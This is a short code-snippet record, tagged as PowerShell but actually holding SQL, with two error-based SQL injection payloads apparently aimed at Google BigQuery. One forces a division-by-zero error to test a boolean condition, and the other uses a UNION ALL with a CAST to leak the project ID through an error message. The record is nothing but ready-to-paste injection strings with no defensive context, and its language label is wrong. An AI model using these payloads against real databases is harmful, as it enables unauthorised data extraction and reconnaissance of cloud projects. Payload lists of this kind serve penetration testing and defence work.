---
id: a4111df8-0398-4605-b506-04d286b810a6
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:32.398527+00:00'
updated_at: '2023-04-10T20:21:06.104767+00:00'
---

# Code Snippet a4111df8

**Language**: ps1

```ps1
# Error based - division by zero
' OR if(1/(length((select('a')))-1)=1,true,false) OR '

# Error based - casting: select CAST(@@project_id AS INT64)
dataset_name.column_name` union all select CAST(@@project_id AS INT64) ORDER BY 1 DESC#
```
